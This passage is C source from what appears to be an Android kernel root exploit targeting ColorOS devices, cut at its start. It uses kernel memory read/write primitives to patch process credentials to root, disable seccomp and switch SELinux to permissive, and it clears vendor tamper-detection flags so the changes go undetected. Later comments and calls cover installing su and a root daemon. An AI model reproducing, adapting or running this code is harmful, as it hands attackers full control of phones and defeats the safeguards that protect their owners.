  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }

  /*
   * vr detag (a.so install_android_root): clear the ColorOS vendor
   * detection bytes in the task header (task+6 and task+0x2c — inside
   * thread_info's vendor area). ColorOS kernel hooks set these when a
   * process tampers with creds/selinux; its watchdog reads them to fire
   * the 15s tamper-reboot AND the same tag makes newly spawned apps get
   * killed at startup (observed: every non-running app crashes after our
   * soft reboot while a.so recovers). Clear both bytes after patching,
   * verify read-back like a.so ("root vr detag").
   */
  {
    /* a.so vr detag parity (Ghidra install_android_root @0x11f14c):
     * THREE clears — tag_a@task+6, tag_b@task+0x2c AND bit10 (0x400 =
     * TIF_SYSCALL_TRACEPOINT) in thread_info.flags@task+0. Bit 10 is the
     * ColorOS syscall MONITORING flag: while set, the vendor tracepoint
     * hook watches this task's syscalls (the child's later setuid(0) /
     * setenforce(0)) → sets the tamper tags → watchdog reboot + newly
     * spawned apps killed at startup (应用闪退). Clearing it disables the
     * monitoring so the child's tampering is invisible to ColorOS. */
    uint64_t flags_before = pipe_read64(fd, current_task_addr);
    uint8_t tag_a = 0xff, tag_b = 0xff;
    pipe_phys_read_data(fd, current_task_addr + 6, &tag_a, 1);
    pipe_phys_read_data(fd, current_task_addr + 0x2c, &tag_b, 1);
    uint8_t zero_byte = 0;
    int w1 = pipe_phys_write_data(fd, current_task_addr + 6, &zero_byte, 1);
    int w2 = pipe_phys_write_data(fd, current_task_addr + 0x2c, &zero_byte, 1);
    int w3 = 1;
    uint64_t flags_want = flags_before & ~(1ULL << 10);
    if (flags_want != flags_before) {
      w3 = pipe_write64(fd, current_task_addr, flags_want);
    }
    uint8_t after_a = 0xff, after_b = 0xff;
    pipe_phys_read_data(fd, current_task_addr + 6, &after_a, 1);
    pipe_phys_read_data(fd, current_task_addr + 0x2c, &after_b, 1);
    uint64_t flags_after = pipe_read64(fd, current_task_addr);
    int detag_ok = w1 && w2 && w3 && after_a == 0 && after_b == 0 &&
                   (flags_after & (1ULL << 10)) == 0;
    pr_info("root vr detag ok=%d tag_a=%u->%u tag_b=%u->%u "
            "flags=%016llx->%016llx\n",
            detag_ok, tag_a, after_a, tag_b, after_b,
            (unsigned long long)flags_before,
            (unsigned long long)flags_after);
    fsync(STDERR_FILENO);
    if (!detag_ok) {
      pr_warning("root vr detag incomplete task=%016llx (continuing)\n",
                 (unsigned long long)current_task_addr);
      fsync(STDERR_FILENO);
    }
  }

  /*
   * NOTE: no "self patch" here. The main process's own cred is a separate
   * COW copy and patching it needs more pipe ops on the child slab page —
   * that pipe read hangs deterministically in D state (run81/82/85, alarm
   * cannot interrupt it). The root child runs the Magica stages instead:
   * after setuid(0) succeeds it IS full root and does adb-root properties,
   * ko load and the soft reboot itself (see spawn_root_child). That is the
   * Magica upstream architecture anyway (a root process performs the
   * late-load bootstrap).
   */
  fsync(STDERR_FILENO);

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  /* selinux_state is .data: configfs write (pipe write of image pages
   * panics). Verified: configfs .data write works. Gated the same way as
   * the child's setenforce: GHOSTLOCK_KEEP_ENFORCING=1 never drops the
   * global flag (child cred already has kernel sid + full caps). */
  char *keep_enf_p = getenv("GHOSTLOCK_KEEP_ENFORCING");
  int selinux_direct_ok = 1;
  if (!keep_enf_p || keep_enf_p[0] != '1') {
    selinux_direct_ok =
        kernel_write_data(fd, selinux_addr, &permissive, sizeof(permissive)) ==
        (ssize_t)sizeof(permissive);
  }
  uint8_t selinux_mid = 0xff;
  kernel_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  capable_head_before = kernel_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  root_child_done = collect_root_child(fd);
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = kernel_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  kernel_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
          report.wallpaper_errno,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  /* DETERMINISTIC enforcing restore: runs 115/117 relied on a ColorOS
   * watcher to pull enforcing back to 1 — that watcher is itself a
   * detection surface, and there is a race window while the flag sits
   * at 0. We dropped it (or the child did via setenforce); now that the
   * child is done, write the pre-exploit value back ourselves. The
   * remaining configfs ops in try_cfi_stage's fops restore already
   * worked under enforcing=1 in every run (the whole pre-root chain
   * runs enforcing).
   *
   * EXCEPTION (a.so parity, run116 fix): under GHOSTLOCK_MAGICA_SOFT_REBOOT=1
   * the parked child kills zygote AFTER this point. a.so kills zygote while
   * STILL permissive (setenforce 0 -> kill -> ColorOS init restores enforcing
   * after the framework restart). Restoring enforcing here would make the
   * deferred zygote kill happen under enforcing -> respawned framework hits
   * SELinux denials -> ColorOS tamper watchdog -> full kernel reboot (~45s).
   * So when a soft reboot is queued, KEEP permissive through the kill. */
  char *soft_rb_env = getenv("GHOSTLOCK_MAGICA_SOFT_REBOOT");
  int want_soft_rb = soft_rb_env && soft_rb_env[0] == '1';
  if (selinux_after == 0 && selinux_before != 0 && !want_soft_rb) {
    uint8_t enf = selinux_before;
    ssize_t rr =
        kernel_write_data(fd, selinux_addr, &enf, sizeof(enf));
    uint8_t chk = 0;
    kernel_read_data(fd, selinux_addr, &chk, sizeof(chk));
    pr_info("root selinux restored %u (ret=%zd chk=%u)\n", selinux_before,
            rr, chk);
    selinux_after = chk;
  } else if (want_soft_rb && selinux_after == 0) {
    pr_info("root selinux KEEP permissive for soft reboot (a.so parity)\n");
    fsync(STDERR_FILENO);
  }
  /* run114 lesson: after the magica soft reboot (zygote kill) ColorOS
   * init RESTORES selinux_enforcing to 1, so selinux_after==0 is not a
   * valid success test when magica ran — the child had already flipped
   * it to 0 (and setenforce(0) succeeded) before the reboot restored
   * the flag. In magica mode the KSU module + su daemon are the root
   * channel; without magica keep the global-permissive verification. */
  return root_child_done && (report.magica_done || report.setenforce_ret == 0);
}
